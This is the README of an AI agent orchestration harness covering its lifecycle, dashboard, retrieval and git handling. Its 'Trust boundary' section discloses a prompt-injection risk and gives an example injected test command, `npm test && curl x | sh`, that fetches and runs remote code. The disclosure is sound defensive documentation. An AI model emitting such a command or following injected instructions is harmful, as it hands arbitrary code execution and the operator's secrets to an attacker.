# Agent Harness v2

Agent Harness turns an idea into verified, committed feature slices through a durable state machine. New runs start with a reflect gate (editable restatement), then a grill-me interview in bounded provider episodes. Every invocation still has a complete persisted work packet, so provider history is an optimization rather than a recovery dependency.

## Quick start

Requires **Node.js 20.3+** (`AbortSignal.any` for cancellable agent timeouts).

```bash
npm install
npm run build
npx agent-harness init
npx agent-harness ui
```

To deploy the harness into another project from this checkout, use the portable
command below. It writes a project-local config, creates and Git-ignores local
state, detects common documentation roots, and can build the first Ollama index:

```powershell
node ./packages/agent-harness/dist/cli.js deploy `
  --project "/path/to/your-project" --ollama --refresh
```

Pass `--sources README.md,docs` to override detection. New deployments enable
Graphify structural code retrieval; it is prepared before the first agent step
of a new run and rebuilt after each verified harness task commit. Use the
advanced `--no-graphify` opt-out for document-only projects.
Source code is normally left to Graphify's structural traversal; add source
paths explicitly only when you want code chunks in document retrieval. Existing
configs are protected unless `--force` is supplied.

Graphify setup is also portable and editable. Deployment creates these files in
the target project without overwriting a team customization:

```text
agent-harness/scripts/setup-graphify.ps1  # Windows
agent-harness/scripts/setup-graphify.sh   # Linux/macOS
```

They install the official `graphifyy` package with `uv` (or `pipx`), verify the
`graphify` command, and build/update `graphify-out/graph.json`. Run the setup
during deployment with `--install-graphify`, or later with the following
command. The prerequisite switches explicitly allow installation of `uv` when
neither `uv` nor `pipx` is available.

```powershell
agent-harness graphify install --project "/path/to/your-project"
agent-harness graphify install --project "/path/to/your-project" --install-prerequisite
agent-harness graphify scripts --project "/path/to/your-project" --reset
```

On Linux/macOS, edit and run `agent-harness/scripts/setup-graphify.sh` directly
or use the same CLI. Reset is always explicit, so a customized package mirror,
version pin, proxy, or bootstrap policy is preserved by ordinary deployments.

The dashboard opens on an authenticated loopback URL and centralizes run creation, human questions, progress, test evidence, session handoffs, artifacts, retries, cancellation, and local knowledge search. Set `CURSOR_API_KEY` for real agent runs. The generated config pins models, commands, retry budgets, TDD policy, git publication, and local knowledge sources.

The lifecycle is:

```text
idea → reflect (editable confirm) → grill-me → implementation tickets
     → [RED → GREEN] → command gates → review → commit → pull request
```

The process stops at `awaiting_input`, `blocked`, `cancelled`, or `completed`. It never waits indefinitely: agent calls, shell commands, locks, schema repair, implementation repair, review repair, grill episodes, and per-command advancement are all bounded.

## Commands

```bash
agent-harness ui                              # open the centralized dashboard
agent-harness ui --port 9000 --no-open        # serve locally without opening a browser
agent-harness start --idea "..."              # `run` is an alias
agent-harness start --idea @idea.md --tdd off
agent-harness status --run-id <id> --json
agent-harness answer --run-id <id> --question <id> --text "..."
agent-harness continue --run-id <id>
agent-harness retry --run-id <id> [--force]
agent-harness retry --run-id <id> --max-run-tokens <n> [--force]
agent-harness retry --run-id <id> --max-run-cost-usd <n> [--force]
agent-harness retry --run-id <id> --commit-dirty [order]
agent-harness retry --run-id <id> --accept-tree
agent-harness cancel --run-id <id>            # out-of-band; does not wait on advance
agent-harness unlock --run-id <id> [--repo]   # remove a stale run/repo lock

agent-harness knowledge refresh
agent-harness knowledge add docs/api.md
agent-harness knowledge search "refund ledger"
agent-harness knowledge search "proration" --include-project billing-service
```

`start --tdd on|off` freezes the override into that run's config snapshot. Later commands load the snapshot, so changing the project config cannot silently change an active run.

`retry --force` overrides a non-retriable block (`blockedRetriable: false`). `--max-run-tokens` / `--max-run-cost-usd` rewrite those ceilings on the run's frozen `config.json` (budget blocks still need `--force`). `amend-config --run-id <id> --patch <json>` applies a reviewed settings patch to a blocked run, records the before/after hashes, and leaves the run blocked for an explicit retry; add `--persist` to use the patch as the default for future runs. `--commit-dirty` commits a dirty tree before retrying; `--accept-tree` re-stamps the working-tree fingerprint after a divergence block.

## Centralized dashboard

The dependency-free browser UI is a read/write client of the same persisted state and engine used by the CLI. It does not keep a competing copy of lifecycle state. Mutating requests are serialized, while polling and artifact reads remain safe during long agent or command work. The top-bar gear opens schema-driven project settings, including test-file glob patterns and the default test command, so each repository can describe its own layout and runner without language-specific harness rules. The test-path editor includes a repository-folder picker that adds the selected folder as a recursive glob. Settings apply to new runs. A blocked run may instead be amended only through a reviewed, user-confirmed harness action that rewrites its frozen snapshot, re-stamps the hash, and records the diff.

Answering a batch is keyboard-driven: `1`–`4` pick an option for the focused question and advance, arrows move between questions, and `Escape` skips one. These fire only when the question container itself holds focus, so typing a digit in the free-text box is never swallowed. "Accept all recommendations" fills every unanswered question with its recommended option but never submits on its own.

Blocked runs key remediation on `blockedKind` (dirty tree, missing agent credential, missing Graphify graph, changed configuration, workspace divergence, provider, budget) with the raw failure kept in a collapsed section. A run that exhausted `workflow.maxStepsPerRun` reports step-budget exhaustion rather than the generic paused-after-restart message; token/cost ceilings surface a raise-and-retry control. While an agent step is in flight, the header shows live activity from `activity.json` (role, model, elapsed, last step summary). The run header also shows accrued usage (`total tokens · cached · cost`) against any configured ceiling.

Background polling (~1.8s while the tab is visible) must not feel like a page reload. The server returns a cheap change `signature`, and an unchanged poll short-circuits before any payload is serialized. Focused HITL editors — and half-filled batch cards with no control currently focused — block silent rewrites, and scroll / `<details>` chrome is restored when a silent poll does rewrite the DOM. The full checklist lives in [docs/ui-polling.md](./docs/ui-polling.md).

The server binds only to `127.0.0.1`, generates a fresh access token, rejects unauthenticated API calls, caps request bodies, and restricts artifact and knowledge paths to the configured workspace. Closing the process closes the UI; runs remain recoverable from disk.

## Durable artifacts

Each run lives under `.agent-harness/runs/<runId>/`:

| Artifact | Purpose |
| --- | --- |
| `state.json` | Authoritative state-machine checkpoint |
| `config.json` | Frozen run configuration |
| `events.jsonl` | Append-only transition history |
| `brief.md` | Confirmed (or draft) feature restatement |
| `grill.md` | Locked grill resolutions |
| `unknowns.md` | Open-unknowns register grouped by status |
| `issues/*.md` | Legacy decision artifacts if present |
| `tasks/*.md` | Tracer-bullet implementation tickets and evidence |
| `packets/*.json` | Complete handoff supplied to one model invocation |
| `sessions/*.json` | Role, model, provider session/run IDs, context mode, exact submitted prompt, outcome, available usage, and handoff summary |
| `sessions/<id>.steps.jsonl` | Bounded, redacted per-step agent activity for one session (no raw tool args) |
| `activity.json` | Live in-flight step snapshot; cleared when the invocation settles |
| `cancel.request` | Out-of-band cancel marker; written by `cancel`, consumed by the advancing process |

The map is an index, not a duplicate source of truth. Full decisions live in their issue files. A session loads the map at low resolution and retrieves relevant issue/document chunks on demand.

## Reflect, grill, and human questions

New runs start with a **reflector** that restates the idea. The dashboard renders that draft as a section-wise editor (goal, users, in/out of scope, assumptions, unknowns); confirming stores the edited brief and starts grilling. Runs created before structured reflect output fall back to the raw markdown editor.

The **griller** asks 1–`workflow.grillQuestionsPerBatch` decision-ready HITL questions per turn (context, 2–4 options, recommendation each). The batch size is a **ceiling, not a target**: only mutually independent questions — where one answer would not change how another is phrased — may share a turn, so a genuinely forking decision is still asked alone. The dashboard collects the whole batch and submits it in one transition, so three independent decisions cost one model round-trip instead of three.

`answer` persists the human's exact words plus the selected option id. Questions can be **skipped**, which parks them without producing a resolution. Partial submission is blocked rather than silently auto-parking, since dropping an interview answer implicitly is worse than asking for an explicit skip. The agent never fills in the human side of the exchange.

### The open-unknowns register

Every griller turn also returns what it still needs resolved, including questions it has not asked yet. The harness keeps this as a register on the run state with engine-owned status (`fog` → `asked` → `resolved`, `parked` when the human skips, or `dropped` when a fog entry disappears from the griller's list without an answer). It is seeded from the reflector's `unknowns` before the first question is asked, written to `unknowns.md`, and surfaced in the dashboard as "N resolved · N open · N parked · N dropped" — so the interview has an observable length instead of running until the griller happens to stop. `dropped` is neither open nor resolved; an entry that reappears returns to the normal fog/asked/parked path.

Reconciliation is a re-projection, not an append: one answer often collapses several latent unknowns and opens new ones. Entries are never deleted, only transitioned; `parked` is sticky until the griller re-asks, and absence of an `asked` entry becomes `resolved` while absence of fog becomes `dropped`. The register reflects the griller's current judgment; it is not a guarantee that the interview ends after the listed entries.

Operators can also add a **note** mid-interview ("don't touch the auth module") without waiting for a question to attach it to. Notes are consumed as authoritative input on the next griller turn, and can optionally seed a human-authored register entry.

When the griller returns `ready_to_plan`, the run pauses on an explicit **grill-complete gate** (`awaiting_input` with `grillReady`). The dashboard (or `agent-harness confirm-grill`) lets the operator continue into planning or send feedback that reopens grilling with a new fog unknown. Planning does not start until that confirmation.

An episode spans at most `workflow.maxGrillQuestionsPerEpisode` answered questions (five by default), then checkpoints and rolls to a new provider agent with the confirmed brief and resolutions so far. Staleness is measured once per batch from its shared `askedAt`: if a batch is submitted more than `workflow.staleAnswerMinutes` (30 by default) after it was asked, the harness discards the episode and continues with a cold packet containing only those questions and answers. Planning, implementation tasks, and review retain clean boundaries. If the Cursor checkpoint cannot be resumed, the backend creates a fresh agent and submits the complete packet instead.

## Scope-aware local retrieval

The default tracker and knowledge system require no external service. Human-readable issues and tasks are local Markdown. Configured docs, skills, and rules (`.md`, `.mdc`, `.yaml`, and supported source files) are chunked into `.agent-harness/knowledge/documents.json` and `chunks.json`; retrieval uses deterministic lexical scoring and stable tie-breaking.

Semantic retrieval is an opt-in enhancement for documents. When enabled, the harness calls an OpenAI-compatible endpoint or a local Ollama endpoint during indexing, stores vectors alongside the lexical index in `.agent-harness/knowledge/embeddings.json`, and merges lexical and cosine-similarity rankings with reciprocal-rank fusion. The key is read only from an environment variable when the chosen provider needs one. Scope and visibility checks happen before vector candidates are ranked, and rules/skills remain on the role- and path-aware guidance path. If the endpoint, credentials, or local vector index are unavailable, search continues with lexical results.

```yaml
knowledge:
  embeddings:
    enabled: true
    # Compatible services can use a different endpoint and model.
    endpoint: https://api.openai.com/v1/embeddings
    model: text-embedding-3-small
    apiKeyEnv: OPENAI_API_KEY
    minSimilarity: 0.2
    lexicalWeight: 1
    semanticWeight: 1
```

For fully local embeddings with Ollama, run `packages/agent-harness/scripts/setup-local-embeddings.ps1` on Windows (append `-InstallOllama` to allow a WinGet install) or `packages/agent-harness/scripts/setup-local-embeddings.sh` on macOS/Linux. Both scripts pull `qwen3-embedding` by default, verify the local API, and print the config fragment. `embeddinggemma` and other Ollama embedding models can be selected by passing a model name. Ollama's local embeddings API is served on `http://localhost:11434/api/embed`; it needs no API key.

```yaml
knowledge:
  embeddings:
    enabled: true
    provider: ollama
    endpoint: http://localhost:11434/api/embed
    model: qwen3-embedding
```

Rules (`.mdc`) and skill roots (`SKILL.md`) are also classified as guidance. New configurations contain a complete `assignments` map for every agent role. That map is authoritative: each role receives only the named rules and skills, including explicitly assigned manual-only skills. A same-kind, same-name entry from the active project overrides the global `General/` entry; when no project entry exists, the harness falls back to `General/`. Empty lists intentionally inject no guidance.

Configurations without `assignments` retain the legacy relevance selector for compatibility. It uses the worker role, objective, known paths, rule `globs`, optional front-matter `roles`, and lexical relevance. In legacy mode, `alwaysApply: true` is a ranking priority rather than unconditional prompt injection. Selected excerpts and reasons are persisted in the work packet, omitted `alwaysApply` rules are recorded in the sibling guidance audit, and generic retrieval excludes selected guidance to avoid duplication.

New runs enable this behavior by default with separate packet budgets: guidance+context, serialized `input`, and a Graphify sub-budget. Guidance itself is capped at 6,000 characters and six entries:

```yaml
workflow:
  contextCharacters: 12000   # guidance + retrieved context
  inputCharacters: 24000     # serialized packet.input
  graphifyCharacters: 3000   # Graphify excerpt within contextCharacters
  reviewDiffCharacters: 12000  # whole-file diff budget for the reviewer packet
  maxRunTokens: 0            # 0 = unlimited; hard stop between steps when exceeded
  maxRunCostUsd: 0           # 0 = unlimited; needs models.pricing for the models in use
  maxProviderRetries: 2      # in-place backoff on provider failures (0–5)
  generateCommitMessages: false  # deterministic per-task subjects; PR body still uses the model
models:
  pricing: {}                # optional: model → { inputPerMillion, outputPerMillion, ... }
knowledge:
  guidance:
    enabled: true
    maxResults: 6
    maxCharacters: 6000
    assignments:
      reflector: { rules: [], skills: [domain-modeling] }
      griller: { rules: [], skills: [grill-me, domain-modeling] }
      planner: { rules: [], skills: [domain-modeling, improve-codebase-architecture] }
      prompt-builder: { rules: [], skills: [] }
      test-writer: { rules: [], skills: [tdd] }
      implementer: { rules: [], skills: [tdd] }
      reviewer: { rules: [], skills: [code-review] }
      message-writer: { rules: [], skills: [] }
      fixer: { rules: [], skills: [diagnose, tdd] }
```

Policies such as `no-legacy-fallback-code` are deliberately opt-in. A project that wants the policy adds its name to the relevant role mappings; a project that needs compatibility behavior leaves it out or supplies a project-specific rule under another assigned name.

Every role must appear when `assignments` is present. Assigned entries are not dropped by `maxResults`, although their excerpts still share `maxCharacters` and the overall context budget. A single budget authority (`buildWorkPacket`) applies these ceilings and records truncations beside the retrieval audit. Set `knowledge.guidance.enabled: false` to retain generic retrieval only. Frozen run configurations created before this setting continue with their original retrieval behavior.

Every indexed document has a scope gate: `global` material is always eligible, while `project` material is eligible only for `knowledge.projectId`. A normal query therefore searches global guidance plus the active project's private documents. To include another project, name it with `--include-project`; only documents indexed with `visibility: shared` can cross that boundary. `private` and `restricted` documents are never returned to another project by this local index.

Multiple project configs can point `knowledge.sharedIndexDirectory` at the same directory. Each config supplies its own `projectId` and source classifications, producing one shared index without a default cross-project search path:

```yaml
knowledge:
  projectId: customer-portal
  sharedIndexDirectory: ../shared-rag-index
  sources:
    - path: docs
      scope: project
    - path: shared-guidance
      scope: global
```

Sources are currently constrained to the configured repository root, so shared global guidance should be available beneath each project root (for example as a submodule or synced folder). A remotely deployed multi-user RAG service must additionally authenticate callers and enforce the same scope filter server-side; the local CLI has no user identity model.

Graphify complements document matches with structural repository traversal. New
harness configs enable it by default. Before the first agent step of each new
run (CLI and UI), the harness verifies both the `graphify` command and
`graphify-out/graph.json`; if either is missing, it runs that project's editable
setup script to install and build the graph. After each verified harness task
commit that includes a source-file path, it runs `graphify update` so the next
task receives fresh structural context. Default Graphify roles are planner,
test-writer, implementer, and reviewer (not reflector/griller). Project-specific
`knowledge.graphify.stopwords` merge over the built-in English and harness-meta
lists. Use `agent-harness graphify install --project .` after code changes made
outside the harness, or enable `knowledge.graphify.updateOnRefresh` if a
document-refresh-triggered rebuild is specifically desired. Graphify is invoked
with an argument array rather than a shell, reads only
`graphify-out/graph.json`, and fails softly during later retrieval. Set
`knowledge.graphify.enabled: false` (or deploy with the advanced
`--no-graphify`) for a document-only project.

## Model tiers and handoffs

`models.small` handles optional prompt compilation and commit/PR copy. `models.capable` handles decisions, planning, implementation, and review. Any role can be pinned independently under `models.roles`.

Prompt compilation is disabled by default because the deterministic renderer is already complete. If explicitly enabled and the compiler fails or times out, the harness falls back to that renderer. Grill episodes never invoke the prompt compiler.

## TDD and deterministic evidence

With TDD on, the harness launches a test writer first, restricts its reported/observed paths to tests, runs the declared targeted command, and requires a meaningful non-timeout failure. Only then does it launch the implementer. Failing GREEN or command-gate output is persisted and included in the next implementation packet. With TDD off, implementation starts first but the same targeted test, gate, review, and repair budgets still apply.

Agents cannot claim a command passed. The harness owns process execution and records exit code, stdout, stderr, duration, and timestamp.

## Repository lock

`start` (preflight / Graphify / knowledge refresh) and `advance` take a process-wide repository lock at `<stateDirectory>/repo.lock`. That serialises working-tree work across runs — including a CLI `advance` beside the UI, or two UI instances — so branch switches and `changedFiles()` reads cannot interleave against one shared tree.

Hold time matches the work: a long `advance` blocks every other run for the same duration. That is intentional with one working tree. `answer`, `answerMany`, `addNote`, `status`, and `cancel` do not take the repository lock, so human input and cancellation stay available while a run is executing. Locks are never taken over automatically, because an age/liveness check cannot safely race another contender; if a holder dies, inspect it and explicitly run `agent-harness unlock --run-id <id> --repo`.

True parallel runs need isolated worktrees; that remains deferred under [Parallel task execution](../../docs/roadmap.md#parallel-task-execution) in the roadmap.

## Git ownership

Agents never run git. The harness:

- refuses to create a run branch from a dirty working tree (checked before the planner runs; a plan already persisted is reused on retry instead of re-invoking);
- creates or reuses `git.branchPrefix/<runId>` from the configured local base branch;
- requires every committed path to have been reported by the task worker;
- asks the small model for commit and pull-request text, with a deterministic fallback;
- optionally pushes and opens a pull request with `gh`;
- never auto-merges.

New runs (dashboard **Start from branch**, `POST /api/runs` `baseBranch`, or CLI `--base-branch`) can override the starting/`--base` branch for that run only; the project default remains `git.baseBranch`.

### Preflight commit

A dirty tree at `start()` blocks by default (`blockedFrom: "new"`), with the offending paths in the failure message. Resolving it by committing is available two ways:

- **Explicit action (default path):** on a blocked run, the dashboard's "Commit changes and retry" control (or `agent-harness retry --run-id <id> --commit-dirty [order]`) commits the tree and clears the block. The offending paths stay visible next to the control so you see what gets swept in before clicking.
- **`git.autoCommitPreflight: true`:** `start()` commits a dirty tree itself instead of blocking. Off by default.

Both paths honor `git.preflightCommitOrder`, which is user-selectable, not fixed:

- `branch-then-commit` (default): creates `git.branchPrefix/<runId>` from **current HEAD** — not `config.git.baseBranch` — then commits onto it. This is a deliberate deviation from the branching rule above: it exists so the dirty tree rides onto the run branch instead of the operator's checked-out branch, and it is recorded on the `run.preflight_committed` audit event (`detail.deviation`).
- `commit-then-branch`: commits on whatever branch is currently checked out; the run branch is then created normally by `plan()` once the tree is clean. The dashboard names that branch on the button so you're not guessing, and shows a caution when it's the same as `config.git.baseBranch`, since that means the commit lands directly on it.

Either way the commit message defaults to `chore: commit working tree before harness run <runId>`, and the audit event records the order, resulting sha, branch, and the exact list of committed files — the harness state directory (`.agent-harness/`) is never included.

## Trust boundary

The harness executes shell commands in the repository root with the operator's full environment — including secrets such as `CURSOR_API_KEY`. Most of those commands come from config (`commands.test`, `commands.gates[].command`). The exception is `task.testCommand`: the planner authors it, materialization copies it verbatim, and the targeted-test step runs it with `shell: true`. A planner induced (via prompt injection from a retrieved document or a repository file) to emit something like `npm test && curl x | sh` gets arbitrary code execution under the operator's credentials.

Mitigations available today: pin `workflow.tdd`, review planner output before execution, and run the harness in a container or VM when the repository or knowledge index may contain untrusted material.

Intended fix (deferred — see [Command allowlisting for model-authored test targets](../../docs/roadmap.md#command-allowlisting-for-model-authored-test-targets)): allowlist `task.testCommand` against `config.commands.test` and `config.commands.gates[].command`, and model per-task targeting as a scoped `testFilter` argument interpolated into a config-owned template rather than as a free-form command string.

## Testing

From the monorepo root (or `packages/agent-harness`):

```bash
npm run test:unit          # Vitest unit suite
npm run test:integration   # Vitest integration suite (real FS / HTTP / ScriptedBackend)
npm run test:e2e:install   # once per machine: download Chromium for Playwright
npm run test:e2e           # Playwright browser E2E against a real loopback UI
npm run build              # required before acceptance tests that spawn dist/cli.js
npm run test:acceptance    # CLI acceptance via createCli injection + compiled bin
npm run test:all           # unit + integration + e2e + build + acceptance
```

E2E tests live in `tests/e2e/`. They do **not** launch the production CLI: each test builds a `ProjectFixture`, injects a `ScriptedBackend`, starts `startUiServer({ port: 0, openBrowser: false })`, and opens the authenticated dashboard URL. Failure artifacts land under Git-ignored `test-results/` (Playwright traces under `test-results/playwright/`).

Acceptance tests inject backends through `createCli({ createBackend, runGraphifySetup, … })` — there is no production CLI flag or config key that selects a test backend. CI is defined in [`.github/workflows/agent-harness.yml`](../../.github/workflows/agent-harness.yml).

## Extension boundaries

`AgentBackend`, `TrackerPort`, `LocalKnowledgeBase`, and `GitService` are replaceable ports. v2 intentionally ships one Cursor backend and one local tracker first; external trackers and parallel isolated task execution can be added without changing the run artifact contract.
